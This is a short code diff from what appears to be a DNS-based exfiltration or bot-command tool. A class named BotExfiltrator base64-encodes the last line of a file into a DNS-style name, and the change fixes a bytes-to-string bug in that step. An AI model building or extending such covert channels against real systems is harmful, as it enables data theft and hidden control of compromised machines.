@@ -74,7 +74,7 @@ class BotExfiltrator(InterceptDefaultResolver):
         with open(filename) as f:
             line = f.readlines()[-1]
         encoded_command = base64.standard_b64encode(line.encode('utf-8'))
-        return '.'.join([encoded_command, name])
+        return '.'.join([encoded_command.decode('utf-8'), name])
 
 #class BotExfiltrator(InterceptDefaultResolver):
 #    def __init__(self):
